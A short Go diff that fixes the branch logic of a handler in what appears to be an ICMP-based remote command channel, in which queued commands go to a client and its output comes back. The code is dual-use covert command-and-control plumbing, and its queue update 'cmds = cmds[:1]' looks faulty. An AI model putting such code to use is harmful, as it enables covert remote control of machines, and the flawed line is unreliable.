@@ -33,10 +33,10 @@ func handlePacket(p *transport.Packet, cmds []string, outCh chan string) {
 	case transport.IcmpCodeCommandRequest:
 		// reply with next command, if any
 		if len(cmds) > 0 {
-			go transport.Send(*p.From, []byte(""), transport.IcmpCodeCommandReply)
-		} else {
 			go transport.Send(*p.From, []byte(cmds[0]), transport.IcmpCodeCommandReply)
 			cmds = cmds[:1]
+		} else {
+			go transport.Send(*p.From, []byte(""), transport.IcmpCodeCommandReply)
 		}
 		break
 	case transport.IcmpCodeCommandOutput:
